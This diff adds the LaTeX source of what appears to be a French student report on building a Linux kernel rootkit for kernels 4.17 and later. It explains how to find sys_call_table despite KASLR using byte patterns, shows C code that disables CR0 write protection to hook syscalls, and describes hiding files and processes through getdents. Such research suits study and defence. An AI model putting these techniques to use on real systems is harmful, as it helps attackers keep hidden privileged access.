@@ -1,0 +1,373 @@
+\documentclass[journal, a4paper]{IEEEtran}
+\usepackage[T1]{fontenc}
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage{hyperref}
+\usepackage{graphicx}
+
+\definecolor{mGreen}{rgb}{0,0.6,0}
+\definecolor{mGray}{rgb}{0.5,0.5,0.5}
+\definecolor{mPurple}{rgb}{0.58,0,0.82}
+\definecolor{backgroundColour}{rgb}{0.95,0.95,0.92}
+
+\lstdefinestyle{CStyle}{
+    backgroundcolor=\color{backgroundColour},   
+    commentstyle=\color{mGreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{mGray},
+    stringstyle=\color{mPurple},
+    basicstyle=\footnotesize,
+    breakatwhitespace=false,         
+    breaklines=true,                 
+    captionpos=b,                    
+    keepspaces=true,                                           
+    showspaces=false,                
+    showstringspaces=false,
+    showtabs=false,                  
+    tabsize=2,
+    language=C
+}
+
+\begin{document}
+	\title{Linux Kernel Rootkit}
+	\author{Castets Nathan \& Huge Olivier}
+	\maketitle
+
+\begin{abstract}
+A partir de la version 4.17 du noyau Linux la solution la plus courament utilisée pour trouver la table des appels systèmes, basée sur l'export de \textit{sys\_close},  n'est plus utilisable. Nous avons donc trouvé une solution alternative pour récupérer la table des appels systèmes et ainsi pouvoir continuer à développer des rootkits. Elle consiste à retracer le code exécuté en préambule d'un appel système pour retrouver un offset vers la table des appels systèmes codé dans la mémoire noyau.
+\end{abstract}
+
+\section{Introduction}
+
+Les rootkits représentent une catégorie des malwares largement répandue et qui peuvent causer des dommages importants aux machines qu'ils visent. Dans ce rapport nous nous intéresserons à leur fonctionnement et comment ils s'installent dans le système pour altérer le comportement de la machine.
+
+Jusqu'à la version 4.16 du noyau Linux la grande majorité des rootkits utilisait la même technique pour s'implanter dans le système depuis plus d'une décennie. Le correctif 4.17 a été publié, a corrigé la faille et a laissé la communauté sans solution immédiate. Jusqu'ici nous n'avons pas trouvé de traces de solutions fonctionnelles disponibles publiquement. Dans la suite de ce rapport nous exposons nos recherches permettants de faire tourner un rootkit sur les versions récentes du noyau avec toutes les sécurités de base. Nos travaux ne concernent que les systèmes basés sur un noyau Linux de versions 4.17 ou supérieures.
+
+Dans un premier temps nous ferons un rapide tour des notions principales et de l'état de l'art des rootkits. Nous verrons en détails les changements opérés dans la version 4.17 du noyau.
+Dans un second temps nous exposerons une technique qui permet d'installer un rootkit sur les versions récentes du noyau avec quelques précisions sur l'implémentation.
+Pour finir nous verrons comment utiliser notre rootkit pour le rendre plus discret aux yeux des utilisateurs d'une machine infectée.
+
+Tous les dumps mémoires ainsi que le code du rootkit sont disponibles sur le Github en référence.
+
+\section{Notions et état de l'art}
+
+Un rootkit est un utilitaire qui permet d'effectuer différentes actions sur une machine. Le but principal est d'installer un accès privilégié à cette machine pour un pirate de façon persistante dans le temps. A la différence d'autres programmes malveillants, un rootkit se veut discret et dissimule au maximum ses actions à l'utilisateur et aux programmes de surveillance.
+
+Il y a deux types de rootkit. Les rootkits qui opèrent dans l'espace utilisateur et ceux qui opèrent dans l'espace noyau. Dans la suite de ce rapport nous nous concentrerons sur le deuxième groupe de rootkits. La majorité des rootkits qui opèrent dans l'espace noyau utilisent la table des appels systèmes (sys\_call\_table) afin d'altérer le comportement de la machine.
+
+La table des appels systèmes est un tableau qui contient toutes les adresses mémoires des fonctions associées appels systèmes. Ces appels systèmes permettent aux programmes de l'espace utilisateur de communiquer avec le noyau. Ils sont indispensables pour les programmes de l'espace utilisateur pour utiliser des fonctions que seul le noyau peut exécuter. Un rootkit a la possibilité de retrouver cette table pour modifier certaines adresses et remplacer les appels systèmes par ses propres fonctions. Avec ce procédé, le rootkit peut choisir quelles informations retourner aux programmes de l'espace utilisateur et altérer le fonctionnement de la machine.
+
+Pour éviter ce type d'attaque une sécurité existe, la  KASLR (Kernel Address Space Layout Randomization). C'est à dire que les différentes parties du code du noyau sont réparties aléatoirement dans la mémoire. Ceci à chaque démarrage du système. Elle existe depuis la version 3.14 du noyau Linux mais nécessitait d'être activée et de recompiler le noyau. Récemment, depuis la version 4.12, elle est activée par défaut. Il est donc non trivial de retrouver l'adresse mémoire de la table des appels système.
+
+Jusqu'à la version 4.17 du noyau Linux, la majorité des rootkits utilisaient une seule et même tehnique pour passer outre la KASLR et accéder à la table des appels système. Le noyau Linux exportait l'adresse de l'appel système \textit{sys\_close()}. C'est à dire que l'adresse de cet appel système était accessible directement par n'importe quel module du noyau Linux. Un module est un programme qui opère dans l'espace noyau. Il est possible d'en déployer en tant que \textit{root} du système. Avec ceci et quelques indications sur la zone mémoire du noyau où se trouver la table des appels système, il suffisait par brute-force de trouver les occurences de l'adresse de \textit{sys\_close()}. Ainsi on retrouvait assez facilement la table des appels systèmes.
+
+\section{Linux kernel 4.17}
+
+Parmi les nombreuses modifications apportées par la version 4.17 du noyau Linux, un correctif a été apporté à la faille. Comme vu précédemment, les rootkits utilisaient l'export de l'appel système \textit{sys\_close()} pour retrouver la table des appels système. Cet export était nécessaire car le module \textit{mount}, qui permet de gérer le système de fichier, avait besoin de cet appel système.
+
+Tout d'abord l'export de l'appel système a été supprimé. On a donc perdu le point d'accroche. Pour que le module \textit{mount} puisse continuer à fonctionner normalement il a été prévu une fonction pour remplacer l'appel système. Cette fonction remplace l'appel système \textit{sys\_close()} pour les programmes de l'espace noyau. Elle ne nous est d'aucune utilité car son adresse n'est pas présente dans la table des appels systèmes.
+
+ Plus généralement dans le noyau, plusieurs modules utilisaient les appels systèmes avant la 4.17. Les développeurs noyaux veulent éviter au maximum cela car ces appels systèmes sont avant tout destinés à l'espace utilisateur. Si jamais il était absolument nécessaire d'utiliser un appel système dans l'espace noyau, une fonction de remplacement de la forme \textit{ksys\_xyzxyz()} a été mise en place. Elle fonctionne de façon similaire à l'appel système qu'elle remplace. Ce changement implique 2 conséquences. La première est que les adresses des appels système ne sont plus présents dans le noyau. La deuxième c'est qu'il n'est plus possible de "hook" les appels systèmes venants du noyau. C'est à dire qu'il n'est plus possible d'altérer le comportement des programmes présents dans l'espace noyau de la même manière qu'avant.
+
+Il est donc maintenant nécessaire de trouver une autre façon de faire pour retrouver l'adresse de la table des appels système que d'utiliser l'adresse d'un appel système exportée.
+
+\section{Déterminer l'adresse de la sys\_call\_table}
+
+L'idée pour atteindre la sys\_call\_table tout en ayant la KASLR activée, est de trouver du code qui la manipule. On peut ensuite récupérer son adresse présente dans le code assembleur en mémoire. Le premier endroit où regarder est du côté des routines qui initialisent la sys\_call\_table ou qui gèrent les appels systèmes. On va remonter le chemin parcouru par la machine quand un appel système est envoyé au noyau depuis l'espace utilisateur.
+
+Pour commencer quand un programme envoie un appel système, le processeur va exécuter une routine en préambule de la fonction associée à l'appel système. L'adresse de cette routine se trouve dans le registre \textit{MSR\_LSTAR}. Au démarrage du système, ce registre est initialisé dans la fonction \textit{syscall\_init()}. Les lignes qui nous intéressent sont les suivantes :
+\\
+\\
+/arch/x86/kernel/cpu/common.c (4.17 - 4.19) :
+\begin{lstlisting}[style=CStyle]
+if (static_cpu_has(X86_FEATURE_PTI))
+ 	wrmsrl(MSR_LSTAR, SYSCALL64_entry_trampoline);
+else
+ 	wrmsrl(MSR_LSTAR, (unsigned long)entry_SYSCALL_64);
+\end{lstlisting}
+/arch/x86/kernel/cpu/common.c (4.20) :
+\begin{lstlisting}[style=CStyle]
+wrmsrl(MSR_LSTAR, (unsigned long)entry_SYSCALL_64);
+\end{lstlisting}
+Dans les version 4.17 à 4.19 la routine commence à \textit{SYSCALL64\_entry\_trampoline} (\textit{X86\_FEATURE\_PTI} est une sécurité contre la faille Meltdown, Page Table Isolation). Il n'est pas possible de tomber directement dans \textit{entry\_SYSCALL\_64} avec un \textit{jmp}. Un \textit{jmp} utilise une adresse relative limitée à 32 bits, insufisante pour atteindre la fonction désirée. On a donc une fonction qui sert de "trampoline" pour finalement retomber dans \textit{entry\_SYSCALL\_64}. En 4.20 il n'y a plus ce problème et l'on tombe directement dans \textit{entry\_SYSCALL\_64}. On continue de suivre la routine :
+\\
+\\
+/arch/x86/entry/entry\_64.S (4.17 - 4.20) :
+\begin{lstlisting}[style=CStyle]
+ENTRY(entry_SYSCALL_64)
+	/* *** */
+
+	pushq	%rax
+
+	PUSH_AND_CLEAR_REGS rax=$-ENOSYS
+	TRACE_IRQS_OFF
+	movq	%rax, %rdi
+	movq	%rsp, %rsi
+	call	do_syscall_64
+	TRACE_IRQS_IRETQ
+	movq	RCX(%rsp), %rcx
+	movq	RIP(%rsp), %r11
+	cmpq	%rcx, %r11
+	jne	swapgs_restore_regs_and_return_to_usermode
+	/* *** */
+\end{lstlisting}
+Une bonne partie de cette fonction est là pour gérer le passage de l'espace utilisateur à l'espace noyau et préparer la fonction associée à l'appel système. Un peu plus loin, on remarque un appel à la fonction \textit{do\_syscall\_64}. Elle va nous être utile car elle contient un appel intéressant :
+\\
+\\
+/arch/x86/entry/common.c (4.17 - 4.20) :
+\begin{lstlisting}[style=CStyle]
+__visible void do_syscall_64(unsigned long nr, struct pt_regs *regs)
+{
+	struct thread_info *ti;
+		enter_from_user_mode();
+		local_irq_enable();
+		ti = current_thread_info();
+		if (READ_ONCE(ti->flags) & _TIF_WORK_SYSCALL_ENTRY)
+			nr = syscall_trace_enter(regs);
+		nr &= __SYSCALL_MASK;
+		if (likely(nr < NR_syscalls)) {
+			nr = array_index_nospec(nr, NR_syscalls);
+			regs->ax = sys_call_table[nr](regs);
+		}
+		syscall_return_slowpath(regs);
+}
+\end{lstlisting}
+On a trouvé notre appel à la \textit{sys\_call\_table} !
+Ces différentes fonctions sont présentes sous forme de bytecode dans la mémoire. Notre objectif est de partir de \textit{MSR\_LSTAR} et de suivre les \textit{call} jusqu'à arriver à l'appel de la \textit{sys\_call\_table}. Pour automatiser la détection des \textit{call}, nous utiliserons des patterns de suite de bytes prédéfinis en fonction de la version du noyau.
+Pour les version 4.17 à 4.19, \textit{MSR\_LSTAR} ne pointant pas directement vers \textit{entry\_SYSCALL\_64}, Il serait long et fastidieux de suivre tous les \textit{call} pour arriver à \textit{entry\_SYSCALL\_64}. Plus il y a de \textit{call} à repérer, plus il y aura de patterns à définir et de probabilité d'échec. Nous utiliserons donc un autre procédé. En analysant plus généralement le fichier /arch/x86/entry/entry\_64.S, on remarque qu'une des fonctions est exportée :
+\\
+\\
+/arch/x86/entry/entry\_64.S (4.17 - 4.19) :
+\begin{lstlisting}[style=CStyle]
+EXPORT_SYMBOL(native_load_gs_index)
+\end{lstlisting}
+On calcule l'offset entre la fonction \textit{native\_load\_gs\_index} et \textit{entry\_SYSCALL\_64}. Elle est identique pour les versions 4.17 à 4.19, 3392 octets. Cette offset sera le même avec ou sans la KASLR car les fonctions du fichier sont chargées d'un seul bloc. On a donc comme point de départ \textit{entry\_SYSCALL\_64} qui vaut \textit{native\_load\_gs\_index} - 3392 pour les version 4.17 à 4.19, et \textit{MSR\_LSTAR} pour la version 4.20.
+On accède au bytecode de la fonction \textit{entry\_SYSCALL\_64} et on cherche un \textit{call} à la fonction \textit{do\_syscall\_64}. On aura préalablement désactivé la KASLR pour avoir l'adresse fixe des différentes fonctions et structures. Cela nous permet de plus facilement repérer les appels qui nous intéressent dans le bytecode. On cherche une suite de bytes de la forme :
+\begin{lstlisting}[style=CStyle]
+e8 ?? ?? ?? ??       callq [offset]
+\end{lstlisting}
+On obtient ainsi un offset par rapport au registre EIP qui correspond à la fonction que l'on cherche. Après une analyse des suites de bytes selon les versions du noyau, les patterns qui précèdent le \textit{call} que l'on cherche :
+\begin{lstlisting}[style=CStyle]
+4.17  
+41 57                 push %r15  
+45 31 ff              xor %r15d, %r15d  
+48 89 c7              mov %rax, %rdi  
+48 89 e6              mov %rsp, %rsi  
+4.18  
+41 57                 push %r15  
+45 31 ff              xor %r15d, %r15d  
+48 89 c7              mov %rax, %rdi  
+48 89 e6              mov %rsp, %rsi  
+4.19  
+41 57                 push %r15  
+45 31 ff              xor %r15d, %r15d  
+48 89 c7              mov %rax, %rdi  
+48 89 e6              mov %rsp, %rsi  
+4.20  
+41 57                 push %r15  
+45 31 ff              xor %r15d, %r15d  
+48 89 c7              mov %rax, %rdi  
+48 89 e6              mov %rsp, %rsi  
+\end{lstlisting}
+On ré-itère le procédé en analysant la suite de bytes de la fonction \textit{do\_syscall\_64}. On cherche un appel à la \textit{sys\_call\_table}. Dans notre cas se sera un \textit{mov} de l'adresse dans un registre :
+\begin{lstlisting}[style=CStyle]
+48 8b 04 fd ?? ?? ?? ?? mov [offset](, %rdi, 8), %rax
+\end{lstlisting}
+Cela nous donne une adresse relative. Après une analyse des suites de bytes selon les versions du noyau, les patterns qui précèdent le \textit{mov} sont les suivants :
+\begin{lstlisting}[style=CStyle]
+4.17  
+48 81 ff 4d 01 00 00  cmp $0x14d, %rdi  
+48 19 c0              sbb %rax, %rax  
+48 21 c7              and %rax, %rdi  
+
+4.18  
+48 81 ff 4f 01 00 00  cmp $0x14f, %rdi  
+48 19 c0              sbb %rax, %rax  
+48 21 c7              and %rax, %rdi  
+4.19  
+48 81 ff 4f 01 00 00  cmp $0x14f, %rdi  
+48 19 c0              sbb %rax, %rax  
+48 21 c7              and %rax, %rdi  
+
+4.20  
+48 81 ff 4f 01 00 00  cmp $0x14f, %rdi  
+48 19 c0              sbb %rax, %rax  
+48 21 c7              and %rax, %rdi  
+\end{lstlisting}
+On a trouvé l'adresse de la \textit{sys\_call\_table}. 
+Il est possible d'avoir en plus de l'adresse de la \textit{sys\_call\_table}, l'adresse de la table des appels système 32 bits. Elle est là pour permettre la rétro-compatibilité des binaires 32 bits. En continuant de regarder le fichier /arch/x86/entry/common.c on dans la fonction \textit{do\_syscall\_32\_irqs\_on} on observe le code suivant :
+\begin{lstlisting}[style=CStyle]
+static __always_inline void do_syscall_32_irqs_on(struct pt_regs *regs)
+{
+	struct thread_info *ti = current_thread_info();
+		unsigned int nr = (unsigned int)regs->orig_ax;
+#ifdef CONFIG_IA32_EMULATION
+		ti->status |= TS_COMPAT;
+#endif
+		if (READ_ONCE(ti->flags) & _TIF_WORK_SYSCALL_ENTRY) {
+			nr = syscall_trace_enter(regs);
+		}
+		if (likely(nr < IA32_NR_syscalls)) {
+			nr = array_index_nospec(nr, IA32_NR_syscalls);
+#ifdef CONFIG_IA32_EMULATION
+		regs->ax = ia32_sys_call_table[nr](regs);
+#else
+		regs->ax = ia32_sys_call_table[nr](
+			(unsigned int)regs->bx,
+			(unsigned int)regs->cx,
+			(unsigned int)regs->dx,
+			(unsigned int)regs->si,
+			(unsigned int)regs->di,
+			(unsigned int)regs->bp);
+#endif
+		}
+	syscall_return_slowpath(regs);
+}
+\end{lstlisting}
+On a un appel à la table que l'on cherche (\textit{ia32\_sys\_call\_table}).
+Cette fonction étant à la suite de \textit{do\_syscall\_64}, il suffit de continuer à regarder les bytes qui succèdent la fonction. On cherche un \textit{mov} de la forme :
+\begin{lstlisting}[style=CStyle]
+48 8b 04 c5 ?? ?? ?? ?? move [offset](, %rax, 8), %rax
+\end{lstlisting}
+Les patterns qui précèdent ce \textit{mov} sont les suivants :
+\begin{lstlisting}[style=CStyle]
+4.17  
+48 81 fa 81 01 00 00  cmp $0x181, %rdx  
+48 19 d2              sbb %rdx, %rdx  
+21 d0                 and %edx, %eax  
+
+4.18  
+48 81 fa 83 01 00 00  cmp $0x183, %rdx  
+48 19 d2              sbb %rdx, %rdx  
+21 d0                 and %edx, %eax  
+48 89 ef              mov %rbp, %rdi  
+4.19  
+48 81 fa 83 01 00 00  cmp $0x183, %rdx  
+48 19 d2              sbb %rdx, %rdx  
+21 d0                 and %edx, %eax  
+48 89 ef              mov %rbp, %rdi  
+
+4.20  
+48 81 fa 83 01 00 00  cmp $0x182, %eax  
+48 19 d2              sbb %rdx, %rdx  
+21 d0                 and %edx, %eax  
+48 89 ef              mov %rbp, %rdi  
+\end{lstlisting}
+On a donc une attaque qui permet de retrouver l'adresse de la \textit{sys\_call\_table} et de \textit{ia32\_sys\_call\_table} avec la KASLR activée. Elle a été testée avec succès sur les versions 4.17 à 4.20 ainsi que 5.0-rc3. Rien n'indique qu'elle ne pourrait pas fonctionner sur d'autres versions. Les seuls étapes susceptibles de changer sont le point d'accroche à la fonction \textit{entry\_SYSCALL\_64} et les patterns pour retrouver les \textit{call} et \textit{mov}.
+\section{Ecraser la sys\_call\_table}
+Nous utiliserons un LKM (Linux Kernel Module) pour faire notre rootkit. Ceci implique qu'un attaquant devra nécessairement avoir un accès \textit{root} à la machine pour y installer le rootkit.  Nous ne verrons pas en détails la fonction qui retrouve l'adresse de la \textit{sys\_call\_table} car la section précédente est assez claire à ce sujet. Néanmoins nous allons apporter quelques précisions sur comment "hook" les appels systèmes.
+La première difficulté est que la page mémoire contenant la \textit{sys\_call\_table} est en \textit{READ-ONLY}. Il est donc nécessaire de modifier temporairement le registre \textit{CR0}. C'est un registre de contrôle sur 32 bits qui régit le comportement du processeur. La partie qui nous intéresse est la protection d'écriture codée sur le 16 ème bits. Elle permet ou non au processeur d'écrire sur une page mémoire en \textit{READ-ONLY} :
+\begin{lstlisting}[style=CStyle]
+static void hook_syscall(void) {
+  if (!sys_call_table) {
+    printk(KERN_INFO "failed to hook syscall64, sys_call_table address is missing");
+    return;
+  }
+  
+  write_cr0(read_cr0() & ~0x10000);
+  real_close = sys_call_table[__NR_close];
+  sys_call_table[__NR_close] = fake_close;
+  write_cr0(read_cr0() | 0x10000);
+}
+static void unhook_syscall(void) {
+  if (!sys_call_table) {
+    printk(KERN_INFO "failed to reset syscall, sys_call_table address is missing");
+    return;
+  }
+  
+  write_cr0(read_cr0() & ~0x10000);
+  sys_call_table[__NR_close] = real_close;
+  write_cr0(read_cr0() | 0x10000);
+}
+\end{lstlisting}
+Le deuxième obstacle est au niveau de la déclaration des appels système. D'après le header (linux/syscalls.h) du noyau, la fonction qui représente l'appel système \textit{sys\_close()} est de la forme :
+\begin{lstlisting}[style=CStyle]
+asmlinkage long sys_close(unsigned int fd);
+\end{lstlisting}
+On pourrait croire qu'il suffit de reprendre la même syntaxe pour notre pointeur de fonction. Le problème est que cela amène à un "kernel panic". Pour comprendre il faut regarder l'appel à la \textit{sys\_call\_table} dans la fonction \textit{do\_syscall\_64} :
+\begin{lstlisting}[style=CStyle]
+/* Avant le correctif */
+regs->ax = sys_call_table[nr](
+			regs->di, regs->si, regs->dx,
+			regs->r10, regs->r8, regs->r9);
+/* Apres le correctif */
+regs->ax = sys_call_table[nr](regs);
+\end{lstlisting}
+Avant le correctif, la fonction \textit{do\_syscall\_64} préparait elle-même les arguments de l'appel système à partir des registres. Après le correctif ceci est fait plus tard. Il est juste nécessaire de donner la structure \textit{pt\_regs} qui est un pointeur vers les registres :
+\begin{lstlisting}[style=CStyle]
+asmlinkage long (*real_close)(struct pt_regs *);
+asmlinkage long fake_close(struct pt_regs *regs) {
+  printk(KERN_INFO "sys_close hooked");
+  return (*real_close)(regs);
+}
+\end{lstlisting}
+\section{Cacher un fichier}
+En utilisant les sections précédentes, nous allons voir comment cacher un fichier à l'utilisateur. Ici, notre objectif sera de dissimuler un fichier à un utilisateur qui appellera l'utilitaire \textit{ls}. Tout d'abord, on analyse \textit{ls} avec  l'utilitaire \textit{strace}. Cela permet de lister tous les appels systèmes effectués par le programme. On finit par remarquer que l'appel système \textit{getdents} (get directory entries) permet de récupérer la liste des fichiers et des dossiers du répertoire.
+La finalité de l'appel système \textit{getdents} est de remplir une structure \textit{linux\_dirent}. Cette structure représente les différentes entrées et se présente sous la forme suivante : 
+\begin{lstlisting}[style=CStyle]
+ struct linux_dirent {
+	unsigned long  d_ino;
+	unsigned long  d_off;
+	unsigned short d_reclen;
+	char d_name[1]; 
+}
+\end{lstlisting}
+Les attributs qui nous intéressent sont \textit{d\_reclen} qui représente la taille de la structure et \textit{d\_name} qui représente le nom de l'entrée. L'attribut \textit{d\_name} est un peu particulier car il ne fera jamais 1 de longueur comme indiqué dans la définition de la définition de la structure. Cela permet juste d'éviter de déclarer un tableau de taille indéterminé. En réalité la chaîne de caractère sera terminé par un caractère \textit{null}. Une structure représente une entrée et les différentes structures sont les unes à la suite des autres. On utilise \textit{d\_reclen} pour connaître la taille de la structure actuelle et donc le début de la suivante.
+L'idée va être de récupérer l'adresse de ces structures et de modifier \textit{d\_reclen} pour en cacher certaines. Comme indiqué précédemment, pour parcourir les différentes structures on utilise l'attribut \textit{d\_reclen} pour passer à la structure suivante. Si l'on souhaite cacher la structure à l'indice \textit{i}, alors on ajoute l'atribut \textit{d\_reclen} de la structure à l'indice \textit{i} à l'attribut \textit{d\_reclen} de la structure à l'indice \textit{i - 1}. Le cas particulier à l'indice \textit{0} peut être résolu en échangeant la structure à l'indice \textit{0} avec la structure à l'indice \textit{1}. Voyons comment implémenter cela.
+La signature de la fonction associée à l'appel système \textit{getdents} est de la forme suivante : 
+\begin{lstlisting}[style=CStyle]
+asmlinkage long sys_getdents64(unsigned int fd,
+				struct linux_dirent64 __user *dirent,
+				unsigned int count);
+\end{lstlisting}
+Le préfixe \textit{\_\_user} est juste là pour mettre en garde le programmeur qui voudrait utiliser le pointeur \textit{dirent}. Celui-ci se trouve dans l'espace utilisateur et on ne peut pas lui accorder notre confiance.La structure qui nous intéresse est \textit{dirent}. Nous avons vu précédemment que l'appel à la \textit{sys\_call\_table} avait changé et que maintenant on utilisait un pointeur vers les différents registres. Si l'on veut accéder au pointeur \textit{*dirent}, il faut récupérer sa valeur dans le registre \textit{\%rsi}.
+Pour créer notre fonction qui va remplacer celle de base associée à l'appel système \textit{getdents}, on commence par appeler la fonction originale qui va se charger de remplir la structure avec les entrées et nous retourner le nombre de total de bytes. On recopie la suite de structure \textit{linux\_dirent} dans un buffer en espace noyau à l'aide de la fonction \textit{copy\_from\_user}. En parcourant les structures, on regarde si un \textit{MAGIC\_PREFIX} est présent dans l'attribut \textit{d\_name}. Si c'est le cas on cache la structure correspondante. On finit par recopier notre buffer en espace noyau à l'adresse de base en espace utilisateur avec la fonction \textit{copy\_to\_user}. On finit par renvoyer le nombre de bytes total comme la fonction d'origine.
+Cette technique peut aussi être utilisée pour cacher un processus à un utilisateur utiliant les utilitaires \textit{ps} ou \textit{top}. Ceci vient du fait que ces utilitaires vont lire les entrées du dossier \textit{/proc}. Chaque processus correspond à une entrée dans ce dossier. Si l'on dissimule une entrée, le processus correspondant ne sera pas affiché par ces utilitaires.
+\section{Fonctionnement Memoire}
+Dans notre démarche de recherche de la syscall table, nous nous sommes demandés s'il n'était pas possible de retrouver la syscall table en attaquant la mémoire noyau directement. Pour cela nous avons dû bien comprendre le fonctionnement de celle-ci, et voir comment on pourrait tenter de détourner de façon malveillante l'API.
+\\
+Dans les systèmes actuels, la mémoire est différenciée en deux types, nous avons d'un coté la mémoire dite virtuelle et de l'autre la mémoire dite physique. La mémoire virtuelle est utilisée au sein des processus pour faire croire à ceux-ci qu'ils disposent d'un grand espace de mémoire contiguë, la mémoire physique quant à elle est celle réellement installée sur le système (RAM,..). Lorsqu'un processus demande l'accès à une adresse particulière, le CPU ne connaît pas les translations, il va donc demander à un autre composant cette translation,le MMU.
+\\
+\includegraphics[scale=0.3]{./mmu.png}
+\\
+Cependant la translation est longue car le MMU parcourt toutes les tables jusqu'à arriver à celle qu'il l'intéresse et donc afin de rendre la translation plus rapide et plus efficace, le MMU dispose d'un cache particulier appelé TLB (translation lookaside buffer).
+\\
+Voici un bref schéma de fonctionnement du MMU
+\includegraphics[scale=0.7]{./TLB.png}
+Il faut savoir que le système travaille avec des pages mémoire de 4KB, il dispose aussi d'une manière très particulière de gérer ces tables. En effet, une page particulière appartient à une Page Table, qui elle même est contenue dans un Page directory. Chaque processus dispose de son propre Page directory et les processeurs actuels utilisent le registre CR3 pour savoir lequel utiliser.
+
+\section{Une première Attaque (ATRA)}
+Lors de nos recherche, nous n'avons pas trouver de méthode efficace pour fouiller la mémoire noyau à la recherche de la syscall table. 
+Cependant nous avons pu trouver une méthode qui consiste, une fois la syscall table trouvée, la dupliquer en mémoire afin de faire utiliser notre copie par le système. Cette méthode s'appelle ATRA  (Adress Translation Redirection Attack), cette attaque consiste à récupérer l'adresse de la syscall table, de créer une nouvelle page mémoire et de copier le contenu de la syscall table dans celle-ci. Pour se faire, on doit retrouver l'adresse physique de la page qui contient la syscall table, et copier son contenu dans la nouvelle. Ensuite, et là réside la difficulté, il nous faut modifier l'entrée correspondante à la vrais syscall table dans la page table en la faisant pointer vers l'adresse physique de notre copie.
+\\
+Cette attaque est surtout employée pour rendre un rootkit plus "furtif" dans le cas où il y a des sécurités hardware sur le système, en effet en faisant une copie et en ne modifiant pas la vrais syscall table le moniteur qui est chargé de vérifier sa validité ne verra pas les modifications.
+\includegraphics[scale=0.22]{./ATRA.png}
+\begin{center}
+schéma de la mémoire après ATRA.
+\end{center}
+On peut aussi noter que ATRA peut être faites en modifiant la valeur des PGD, cependant cela ne rend pas l'attaque complète car comme dit plus haut chaque processus a son propre PGD, il faudrait donc faire la modification pour tous les processus.
+\section{Une seconde attaque}
+Dans cette partie, nous allons discuter d'une idée potentielle pour trouver l'adresse de la syscall table au sein du système. En regardant de plus près le fonctionnement de la mémoire, nous pouvons voir que les pages noyau (contenant les structures) sont toutes partagées entre chaque processus. C'est à dire que dans chaque espace mémoire de chaque processus on peut retrouver un pointeur vers les structures noyau. On peut retrouver le registre CR3 avec un code assembleur. Donc il pourrait en pratique être possible d'explorer le PGD d'un processus et de retrouver dans sa mémoire un pointeur vers la syscall table. Cependant nous nous sommes heurtés à une sécurité (PTI) qui nous empêchée, même avec les droits noyau, d'aller explorer des pages mémoire en dehors de notre module. 
+\section{Conclusion}
+A partir d'un noyau Linux de version 4.17 ou supérieure, nous avons développé une solution permettant de retrouver la table des appels systèmes. Plus précisément nous avons retracé le code exécuté en préambule d'un appel système afin de retrouver un offset vers la table des appels systèmes codé dans la mémoire noyau. A l'aide de ceci nous avons développé un "hook" de l'appel système \textit{getdents} permettant de cacher des fichiers aux utilisateurs.
+Nous avons décrit cette solution pour des version 4.17 à 4.20 du noyau Linux. Il n'en reste pas moins possible d'appliquer le même raisonnement à n'importe quelle autre version du noyau. Quelques ajustements seront peut être nécessaires au niveau des patterns.
+\\
+Nous pouvons aussi voir qu'il existe des failles au sein de la mémoire elle même. Cependant elles restent compliquées à exploiter aux vues de la difficulté et du peu de documentation qu'il y a sur les codes linux gérant la mémoire.
+\begin{thebibliography}{}
+	\bibitem{1}
+	Sources du projet\\
+	github.com/naka53/prime\\
+	\bibitem{2}
+	System calls in the Linux kernel\\
+	0xax.gitbooks.io/linux-insides/content/SysCall\\
+	\bibitem{3}
+	Linux Kernel Sources\\
+	github.com/torvalds/linux\\
+	\bibitem{4}
+	Memory and Page table\\
+	kernel.org/doc/gorman/html/understand\\
+	\bibitem{5}
+	ATRA\\
+	cysec.kaist.ac.kr/publications/ACM\_CCS\_2014\_ATRA.pdf\\
+\end{thebibliography}
+\end{document}
